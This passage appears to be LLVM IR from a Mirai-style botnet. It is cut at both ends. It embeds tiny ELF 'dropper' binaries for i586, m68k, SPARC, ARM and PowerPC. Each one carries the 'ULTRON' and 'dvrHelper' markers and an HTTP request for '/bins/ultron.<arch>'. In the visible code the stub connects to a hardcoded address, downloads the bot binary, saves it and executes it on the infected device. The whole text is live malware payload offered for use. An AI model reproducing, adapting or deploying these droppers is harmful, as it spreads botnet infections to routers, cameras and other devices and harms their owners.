powerpc\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.powerpc HTTP/1.0\0D\0A\0D\0A\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.sbss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\10\00\00\94\00\00\00\94\00\00\03\BC\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\10\00\04P\00\00\04P\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\10\01\04\A4\00\00\04\A4\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04\A4\00\00\00\1F\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_i586 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1197 x i8], [1197 x i8]* @.str.270, i32 0, i32 0), i8* null], align 16
@.str.270 = private unnamed_addr constant [1197 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\03\00\01\00\00\00$\83\04\084\00\00\00\E4\03\00\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\04\08\00\80\04\08\C1\03\00\00\C1\03\00\00\05\00\00\00\00\10\00\00\01\00\00\00\C4\03\00\00\C4\93\04\08\C4\93\04\08\00\00\00\00\04\00\00\00\06\00\00\00\00\10\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04\00\00\00U\89\E5\0F\B6U\08\0F\B6E\0C\C1\E2\18\C1\E0\10\09\C2\0F\B6M\10\0F\B6E\14\C1\E1\08\09\C2\09\D1]\89\CA\89\C8\C1\E0\18\81\E2\00\FF\00\00\C1\E2\08\09\D0\89\CA\C1\EA\18\81\E1\00\00\FF\00\C1\E9\08\09\CA\09\D0\C3U\89\E5\83\EC\10\FFu\08j\01\E8D\02\00\00\83\C4\10\C9\C3U\89\E5\83\EC\10\FFu\08j\06\E8/\02\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\05\E8\17\02\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\03jf\E8\F0\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\04\E8\D8\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\03\E8\C0\01\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\01jf\E8\99\01\00\00\C9\C3U\B8}\83\04\08\89\E5WVS\81\EC\AC\00\00\00\EB\01@\808\00u\FA-}\83\04\08\89\85P\FF\FF\FFPj\07h\82\83\04\08j\01\E8v\FF\FF\FFh\D9\00\00\00f\C7E\E0\02\00jRf\C7E\E2\00Ph\EB\00\00\00h\A8\00\00\00\E8\A6\FE\FF\FF\83\C4\1C\89E\E4h\FF\01\00\00hA\02\00\00h\8A\83\04\08\E8\FB\FE\FF\FF\83\C4\0C\89\C7j\00j\01j\02\E8Z\FF\FF\FF\83\C4\10\89\C6\83\F8\FFt\05\83\FF\FFu\0D\83\EC\0Cj\01\E8\AB\FE\FF\FF\83\C4\10P\8DE\E0j\10PV\E8\DA\FE\FF\FF\83\C4\10\89\C3\85\C0y\1C\F7\DBPj\04h\94\83\04\08j\01\E8\E7\FE\FF\FF\89\1C$\E8y\FE\FF\FF\83\C4\10\8B\9DP\FF\FF\FFP\83\C3\1DSh\99\83\04\08V\E8\C6\FE\FF\FF\83\C4\109\D8t\0D\83\EC\0Cj\03\E8O\FE\FF\FF\83\C4\101\DBP\8DE\F3j\01PV\E8\BB\FE\FF\FF\83\C4\10Ht\0D\83\EC\0Cj\04\E8-\FE\FF\FF\83\C4\10\0F\BEE\F3\C1\E3\08\09\C3\81\FB\0A\0D\0A\0Du\CF\8D\9D`\FF\FF\FFQh\80\00\00\00SV\E8\84\FE\FF\FF\83\C4\10\85\C0~\0ERPSW\E8\5C\FE\FF\FF\83\C4\10\EB\D8\83\EC\0CV\E8\FD\FD\FF\FF\89<$\E8\F5\FD\FF\FF\83\C4\0Cj\04h\BC\83\04\08j\01\E85\FE\FF\FF\C7\04$\05\00\00\00\E8\C3\FD\FF\FF\83\C4\10\8De\F4[^_]\C3U\89\E5]\E9l\FE\FF\FF\90\90\90UWVS\8Bl$,\8B|$(\8Bt$$\8BT$ \8BL$\1C\8B\5C$\18\8BD$\14\CD\80[^_]=\01\F0\FF\FF\0F\83\01\00\00\00\C3\83\EC\0C\89\C2\F7\DA\E8\09\00\00\00\89\10\83\C8\FF\83\C4\0C\C3\B8\C4\93\04\08\C3i586\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.i586 HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\94\80\04\08\94\00\00\00\E9\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00}\83\04\08}\03\00\00D\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\C4\93\04\08\C4\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\C4\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_m68k = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1253 x i8], [1253 x i8]* @.str.271, i32 0, i32 0), i8* null], align 16
@.str.271 = private unnamed_addr constant [1253 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\04\00\00\00\01\80\00\03>\00\00\004\00\00\04\1C\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\00\00\01\00\00\00\00\80\00\00\00\80\00\00\00\00\00\03\FC\00\00\03\FC\00\00\00\05\00\00 \00\00\00\00\01\00\00\03\FC\80\00#\FC\80\00#\FC\00\00\00\00\00\00\00\08\00\00\00\06\00\00 \00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04NV\00\00\12.\00\0Bp\18\E1\A9B\80\10.\00\0FH@B@\82\80\82.\00\17B\80\10.\00\13\E1\88\80\81N^NuNV\00\00/.\00\08Hx\00\01a\FF\00\00\02\80P\8FN^NuNV\00\00/.\00\08Hx\00\06a\FF\00\00\02hN^NuNV\00\00/.\00\10/.\00\0C/.\00\08Hx\00\05a\FF\00\00\02JN^NuNV\FF\F4-n\00\08\FF\F4-n\00\0C\FF\F8-n\00\10\FF\FCHn\FF\F4Hx\00\03Hx\00fa\FF\00\00\02\1EN^NuNV\00\00/.\00\10/.\00\0C/.\00\08Hx\00\04a\FF\00\00\02\00N^NuNV\00\00/.\00\10/.\00\0C/.\00\08Hx\00\03a\FF\00\00\01\E2N^NuNV\FF\F4-n\00\08\FF\F4-n\00\0C\FF\F8-n\00\10\FF\FCHn\FF\F4Hx\00\01Hx\00fa\FF\00\00\01\B6N^NuNV\FFlH\E780E\F9\80\00\03\B8`\02R\8AJ\12f\FA\95\FC\80\00\03\B8Hx\00\07Hy\80\00\03\BDHx\00\01a\FF\FF\FF\FFl=|\00\02\FF\EE=|\00P\FF\F0Hx\00\D9Hx\00RHx\00\EBHx\00\A8a\FF\FF\FF\FE\A8O\EF\00\10-@\FF\F2Hx\01\FFHx\02AHy\80\00\03\C5a\FF\FF\FF\FE\E4(\00B\A7Hx\00\01Hx\00\02a\FF\FF\FF\FFX&\00O\EF\00$p\FF\B0\83g\04\B0\84f\0CHx\00\01a\FF\FF\FF\FE\8AX\8FHx\00\10Hn\FF\EE/\03a\FF\FF\FF\FE\C4$\00O\EF\00\0Cl\22Hx\00\04Hy\80\00\03\CFHx\00\01a\FF\FF\FF\FE\D4D\82/\02a\FF\FF\FF\FERO\EF\00\10E\EA\00\1D/\0AHy\80\00\03\D4/\03a\FF\FF\FF\FE\B2O\EF\00\0C\B5\C0g\0CHx\00\03a\FF\FF\FF\FE(X\8FB\82Hx\00\01Hn\FF\FF/\03a\FF\FF\FF\FE\AAO\EF\00\0Cr\01\B2\80g\0CHx\00\04a\FF\FF\FF\FE\00X\8F\E1\8A\10.\FF\FFI\C0\84\80\0C\82\0D\0A\0D\0Af\C8Hx\00\80$\0E\06\82\FF\FF\FFn/\02/\03a\FF\FF\FF\FElO\EF\00\0CG\F9\80\00\016J\80o\0E/\00/\02/\04N\93O\EF\00\0C`\CE/\03E\F9\80\00\00\D6N\92/\04N\92Hx\00\04Hy\80\00\03\F7Hx\00\01N\93Hx\00\05a\FF\FF\FF\FD\92O\EF\00\18L\EE\0C\1C\FFXN^NuNV\00\00a\FF\FF\FF\FEZN^NuNV\FF\F8H\E7<\00 n\00 *.\00\1C(.\00\18&.\00\14$.\00\10\22.\00\0C .\00\08N@-@\FF\F8 .\FF\F8r\82\B2\80d\1A .\FF\F8D\80-@\FF\FCa\FF\00\00\00\1C \AE\FF\FCr\FF-A\FF\F8 .\FF\F8L\EE\00<\FF\E8N^NuNV\00\00 <\80\00#\FC @N^Num68k\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.m68k HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\80\00\00\94\00\00\00\94\00\00\03$\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\80\00\03\B8\00\00\03\B8\00\00\00D\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\80\00#\FC\00\00\03\FC\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\03\FC\00\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_sparc = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1289 x i8], [1289 x i8]* @.str.272, i32 0, i32 0), i8* null], align 16
@.str.272 = private unnamed_addr constant [1289 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\02\00\00\00\01\00\01\03h\00\00\004\00\00\04@\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\00\00\01\00\00\00\00\00\01\00\00\00\01\00\00\00\00\04 \00\00\04 \00\00\00\05\00\01\00\00\00\00\00\01\00\00\04 \00\02\04 \00\02\04 \00\00\00\00\00\00\00\08\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04\96\0A\E0\FF\91* \18\92\0A`\FF\94\0A\A0\FF\93*`\10\95*\A0\08\90\12\00\09\90\12\00\0B\81\C3\E0\08\90\12\80\08\92\10\00\08\90\10 \01\82\13\C0\00\10\80\00\AC\01\00\00\00\01\00\00\00\92\10\00\08\90\10 \06\82\13\C0\00\10\80\00\A6\01\00\00\00\01\00\00\00\82\10\00\09\96\10\00\0A\92\10\00\08\94\10\00\01\90\10 \05\82\13\C0\00\10\80\00\9D\01\00\00\00\01\00\00\00\9D\E3\BF\88\92\10 \03\F0'\BF\EC\F2'\BF\F0\F4'\BF\F4\94\07\BF\EC@\00\00\94\90\10 \CE\81\C7\E0\08\91\E8\00\08\82\10\00\09\96\10\00\0A\92\10\00\08\94\10\00\01\90\10 \04\82\13\C0\00\10\80\00\8A\01\00\00\00\01\00\00\00\82\10\00\09\96\10\00\0A\92\10\00\08\94\10\00\01\90\10 \03\82\13\C0\00\10\80\00\81\01\00\00\00\01\00\00\00\9D\E3\BF\88\92\10 \01\F0'\BF\EC\F2'\BF\F0\F4'\BF\F4\94\07\BF\EC@\00\00x\90\10 \CE\81\C7\E0\08\91\E8\00\08\9D\E3\BF\00\03\00\00@\A0\10c\C8\C2L\00\00\80\A0`\002\BF\FF\FE\A0\04 \01\03\00\00@\82\10c\C8\94\10 \07\A6$\00\01\90\10 \01\13\00\00@\7F\FF\FF\D7\92\12c\D0\82\10 \02\C27\BF\E4\82\10 P\96\10 \D9\C27\BF\E6\92\10 \EB\94\10 R\7F\FF\FF\A5\90\10 \A8\92\10&\01\D0'\BF\E8\94\10!\FF\11\00\00@\7F\FF\FF\B5\90\12#\D8\92\10 \01\A4\10\00\08\94\10 \00\7F\FF\FF\D5\90\10 \02\80\A2?\FF\02\80\00\05\A2\10\00\08\80\A4\BF\FF\12\80\00\05\90\10\00\11\7F\FF\FF\9C\90\10 \01\90\10\00\11\92\07\BF\E4\7F\FF\FF\AD\94\10 \10\A0\92 \006\80\00\0A\A0\04\E0\1D\90\10 \01\13\00\00@\94\10 \04\7F\FF\FF\AF\92\12c\E8\7F\FF\FF\8E\90 \00\10\A0\04\E0\1D\90\10\00\11\13\00\00@\94\10\00\10\7F\FF\FF\A7\92\12c\F0\80\A2\00\10\02\80\00\05\A0\10 \00\7F\FF\FF\83\90\10 \03\A0\10 \00\92\07\BF\F7\94\10 \01\7F\FF\FF\A6\90\10\00\11\80\A2 \01\02\80\00\05\C2O\BF\F7\7F\FF\FFy\90\10 \04\C2O\BF\F7\85, \08\A0\10\80\01\03\03B\83\82\10a\0A\80\A4\00\01\12\BF\FF\F2\92\07\BF\F7\A0\07\BFd\90\10\00\11\92\10\00\10\7F\FF\FF\94\94\10 \80\80\A2 \00\04\80\00\07\94\10\00\08\92\10\00\10\7F\FF\FF\85\90\10\00\12\10\BF\FF\F6\A0\07\BFd\7F\FF\FFh\90\10\00\11\7F\FF\FFf\90\10\00\12\94\10 \04\90\10 \01\13\00\00A\7F\FF\FFz\92\12`\18\7F\FF\FFY\90\10 \05\81\C7\E0\08\81\E8\00\00\82\13\C0\00\10\BF\FF\8F\01\00\00\00\01\00\00\00\82\10\00\08\90\10\00\09\92\10\00\0A\94\10\00\0B\96\10\00\0C\98\10\00\0D\91\D0 \10\0A\80\00\04\01\00\00\00\81\C3\E0\08\01\00\00\00\9D\E3\BF\98@\00\00\05\01\00\00\00\F0\22\00\00\81\C7\E0\08\91\E8?\FF\11\00\00\81\81\C3\E0\08\90\12  spc\00\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00\00\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.spc HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\01\00\94\00\00\00\94\00\00\034\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\01\03\C8\00\00\03\C8\00\00\00X\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\02\04 \00\00\04 \00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04 \00\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_armv4l = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1177 x i8], [1177 x i8]* @.str.273, i32 0, i32 0), i8* null], align 16
@.str.273 = private unnamed_addr constant [1177 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\1C\83\00\004\00\00\00\D0\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\B0\03\00\00\B0\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00\B0\03\00\00\B0\03\01\00\B0\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\97\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\93\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1\8C\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5\84\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1{\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1t\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5l\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9tA\9F\E5\94\D0M\E2\00\00\00\EA\01@\84\E2\00`\D4\E5\00\00V\E3\FB\FF\FF\1AX1\9F\E5X\11\9F\E5\07 \A0\E3\01\00\A0\E3\04\80c\E0\D9\FF\FF\EB\02@\A0\E3P\C0\A0\E3\D90\A0\E3\EB\10\A0\E3R \A0\E3\A8\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A5\FF\FF\EB\1C\11\9F\E5\84\00\8D\E5\18!\9F\E5\18\01\9F\E5\B8\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D2\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\A6\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B1\FF\FF\EB\00@P\E2\05\00\00\AA\01\00\A0\E3\D0\10\9F\E5\04 \A0\E3\B5\FF\FF\EB\00\00d\E2\9A\FF\FF\EB\1D@\88\E2\05\00\A0\E1\B8\10\9F\E5\04 \A0\E1\AE\FF\FF\EB\04\00P\E1\03\00\A0\13\92\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\AD\FF\FF\EB\01\00P\E3\04\00\A0\E3\8A\FF\FF\1B\930\DD\E5\04D\83\E1|0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\A1\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1|\FF\FF\EB\07\00\A0\E1z\FF\FF\EB8\10\9F\E5\04 \A0\E3\01\00\A0\E3\8B\FF\FF\EB\05\00\A0\E3p\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\5C\83\00\00d\83\00\00A\02\00\00\FF\01\00\00l\83\00\00x\83\00\00\80\83\00\00\0A\0D\0A\0D\A8\83\00\00\95\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1\B0\03\01\00armv4l\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.armv4l HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\E8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\5C\83\00\00\5C\03\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\B0\03\01\00\B0\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\B0\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_armv5l = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1177 x i8], [1177 x i8]* @.str.274, i32 0, i32 0), i8* null], align 16
@.str.274 = private unnamed_addr constant [1177 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\1C\83\00\004\00\00\00\D0\03\00\00\02\00\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\B0\03\00\00\B0\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00\B0\03\00\00\B0\03\01\00\B0\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\97\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\93\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1\8C\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5\84\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1{\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1t\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5l\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9tA\9F\E5\94\D0M\E2\00\00\00\EA\01@\84\E2\00`\D4\E5\00\00V\E3\FB\FF\FF\1AX1\9F\E5X\11\9F\E5\07 \A0\E3\01\00\A0\E3\04\80c\E0\D9\FF\FF\EB\02@\A0\E3P\C0\A0\E3\D90\A0\E3\EB\10\A0\E3R \A0\E3\A8\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A5\FF\FF\EB\1C\11\9F\E5\84\00\8D\E5\18!\9F\E5\18\01\9F\E5\B8\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D2\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\A6\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B1\FF\FF\EB\00@P\E2\05\00\00\AA\01\00\A0\E3\D0\10\9F\E5\04 \A0\E3\B5\FF\FF\EB\00\00d\E2\9A\FF\FF\EB\1D@\88\E2\05\00\A0\E1\B8\10\9F\E5\04 \A0\E1\AE\FF\FF\EB\04\00P\E1\03\00\A0\13\92\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\AD\FF\FF\EB\01\00P\E3\04\00\A0\E3\8A\FF\FF\1B\930\DD\E5\04D\83\E1|0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\A1\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1|\FF\FF\EB\07\00\A0\E1z\FF\FF\EB8\10\9F\E5\04 \A0\E3\01\00\A0\E3\8B\FF\FF\EB\05\00\A0\E3p\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\5C\83\00\00d\83\00\00A\02\00\00\FF\01\00\00l\83\00\00x\83\00\00\80\83\00\00\0A\0D\0A\0D\A8\83\00\00\95\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1\B0\03\01\00armv5l\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.armv5l HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\E8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\5C\83\00\00\5C\03\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\B0\03\01\00\B0\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\B0\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_powerpc440fp = local_unnamed_addr global i8* getelementptr inbounds ([2534 x i8], [2534 x i8]* @.str.275, i64 0, i64 0), align 8
@.str.275 = private unnamed_addr constant [2534 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\14\00\00\00\01\10\00\03\E8\00\00\004\00\00\050\00\00\00\00\004\00 \00\03\00(\00\08\00\05\00\00\00\01\00\00\00\00\10\00\00\00\10\00\00\00\00\00\04\B0\00\00\04\B0\00\00\00\05\00\01\00\00\00\00\00\01\00\00\04\B0\10\01\04\B0\10\01\04\B0\00\00\00\00\00\00\00\08\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04T\84\80\1ETc\C0\0E|c#xT\A5@.|c3x|\A3\1BxN\80\00 \94!\FF\F0|\08\02\A6|d\1Bx8`\00\01\90\01\00\14L\C61\82H\00\03%\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|d\1Bx8`\00\06\90\01\00\14L\C61\82H\00\02\F9\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\05L\C61\82H\00\02\C1\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\03\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\02\85\80\01\00$8!\00 |\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\04L\C61\82H\00\02M\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\F0|\08\02\A6|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\03L\C61\82H\00\02\15\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\01\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\01\D9\80\01\00$8!\00 |\08\03\A6N\80\00 \94!\FF@|\08\02\A6= \10\00\BF\81\00\B0;\A9\04P\90\01\00\C4H\00\00\08;\BD\00\01\88\1D\00\00/\80\00\00@\9E\FF\F4<\80\10\00= \10\009)\04P8\84\04`8\A0\00\078`\00\01\7F\A9\E8PK\FF\FF\0D8\00\00\028\C0\00\D98\80\00\EB8\A0\00R\B0\01\00\0C8`\00\A88\00\00P\B0\01\00\0EK\FF\FE\01\90a\00\10<`\10\008\80\02A8\A0\01\FF8c\04hK\FF\FE]8\80\00\01||\1Bx8\A0\00\008`\00\02K\FF\FF-/\83\FF\FF|~\1BxA\9E\00\0C/\9C\FF\FF@\BE\00\0C8`\00\01K\FF\FD\D5\7F\C3\F3x8\81\00\0C8\A0\00\10K\FF\FEU|\7F\1By@\A0\00 